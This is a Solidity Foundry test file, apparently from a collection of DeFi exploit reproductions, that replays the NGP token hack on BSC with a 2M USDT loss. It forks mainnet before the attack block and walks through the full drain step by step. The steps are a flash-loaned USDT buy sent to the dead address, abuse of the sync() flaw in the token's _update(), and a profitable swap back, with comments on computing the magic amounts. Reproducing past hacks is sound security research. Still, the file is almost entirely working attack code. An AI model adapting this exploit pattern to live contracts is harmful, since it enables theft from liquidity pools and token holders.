// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2M USDT
// Attacker : https://bscscan.com/address/0x0305ddd42887676ec593b39ace691b772eb3c876
// Attack Contract : https://bscscan.com/address/0x2d2a69bdafe4aad981da4e98721b3b81a0315363
// Vulnerable Contract : https://bscscan.com/address/0xd2f26200cd524db097cf4ab7cc2e5c38ab6ae5c9
// Attack Tx : https://bscscan.com/tx/0xc2066e0dff1a8a042057387d7356ad7ced76ab90904baa1e0b5ecbc2434df8e1

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xd2f26200cd524db097cf4ab7cc2e5c38ab6ae5c9#code

// @Analysis
// Post-mortem : https://blog.solidityscan.com/ngp-token-hack-analysis-414b6ca16d96
// Twitter Guy : N/A
// Hacking God : N/A

contract NGP_EXP is BaseTestWithBalanceLog {
    IERC20Metadata public ngpToken = IERC20Metadata(0xd2F26200cD524dB097Cf4ab7cC2E5C38aB6ae5c9);
    IERC20Metadata public usdt = IERC20Metadata(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter public router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address public pair = 0x20cAb54946D070De7cc7228b62f213Fccf3ffb1E;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    MockFlashloanProvider public mockFlashloanProvider;
    // These two magic values need to be calculated in advance to satisfy:
    // (1) Trigger the sync() in _update() of NGT token.
    // (2) reduce the pair's NGT balance as more as possible.
    uint256 public FLASHLOAN_AMOUNT = 211_000_000 * 10 ** 18;
    uint256 public PREPARATION_NGP_AMOUNT = 1_350_000 * 10 ** 18;
    function setUp() public {
        vm.createSelectFork("bsc", 61515895 - 1);

        mockFlashloanProvider = new MockFlashloanProvider();
        deal(address(usdt), address(mockFlashloanProvider), FLASHLOAN_AMOUNT); // give the flashloan provider the flashloan amount
        deal(address(usdt), address(this), 0); // clean the attacker's USDT balance
        // We give the attacker some NGT tokens.
        // In actual attack, the attacker needs to buy the NFT tokens for multiple times since the attacker is not in the
        // whitelist. Here we just simulate this behavior.
        deal(address(ngpToken), address(this), PREPARATION_NGP_AMOUNT);

        vm.label(address(usdt), "USDT");
        vm.label(address(ngpToken), "NGP Token");
        vm.label(pair, "Pair");
        vm.label(deadAddress, "Dead Address");
        vm.label(address(mockFlashloanProvider), "Mock Flashloan Provider");
        vm.label(address(router), "Router");
        vm.label(address(this), "Attacker");
    }

    function testExploit() public {
        mockFlashloanProvider.aggregateFlashloan();

        logTokenBalance(address(usdt), address(this), "[In the end] Attacker");
    }

    function flashloanCallback() public {        
        // step 1: preparations
        usdt.approve(address(router), type(uint256).max);
        ngpToken.approve(address(router), type(uint256).max);

        logTokenBalance(address(ngpToken), pair, "[Before attack] Pair");
        logTokenBalance(address(usdt), pair, "[Before attack] Pair");
        logTokenBalance(address(ngpToken), address(this), "[Before attack] Attacker");
        logTokenBalance(address(usdt), address(this), "[Before attack] Attacker");
        console.log();

        // step 2: swap usdt to NGT and send the NGT to dead address.
        // The goal is to reduce the pair's NGT balance.
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(ngpToken);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(FLASHLOAN_AMOUNT, 0, path, deadAddress, block.timestamp);

        logTokenBalance(address(ngpToken), pair, "[After 1st swap] Pair");
        logTokenBalance(address(usdt), pair, "[After 1st swap] Pair");
        logTokenBalance(address(ngpToken), address(this), "[After 1st swap] Attacker");
        logTokenBalance(address(usdt), address(this), "[After 1st swap] Attacker");
        console.log();

        // step 3: swap NGT to USDT.
        // It will trigger the bug in _update() of NGT token: the sync() will be called and the price is manipulated.
        path[0] = address(ngpToken);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(ngpToken.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        logTokenBalance(address(ngpToken), pair, "[After 2nd swap] Pair");
        logTokenBalance(address(usdt), pair, "[After 2nd swap] Pair");
        logTokenBalance(address(ngpToken), address(this), "[After 2nd swap] Attacker");
        logTokenBalance(address(usdt), address(this), "[After 2nd swap] Attacker");
        console.log();

        // step 4: transfer back the flashloan amount
        usdt.transfer(address(mockFlashloanProvider), FLASHLOAN_AMOUNT);
    }

    receive() external payable {}
}

interface IFlashLoanReceiver {
    function flashloanCallback() external;
}

/// @notice A mock flashloan provider for testing.
contract MockFlashloanProvider {
    IERC20Metadata public usdt = IERC20Metadata(0x55d398326f99059fF775485246999027B3197955);

    /// @notice Aggregate the different flashloan providers.
    /// @dev This is a mock function for testing. In production, the attacker should implement the actual flashloan logic.
    function aggregateFlashloan() public {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.transfer(msg.sender, usdtBalance);
        IFlashLoanReceiver(msg.sender).flashloanCallback();
        require(usdt.balanceOf(address(this)) == usdtBalance, "Flashloan failed");
    }
}
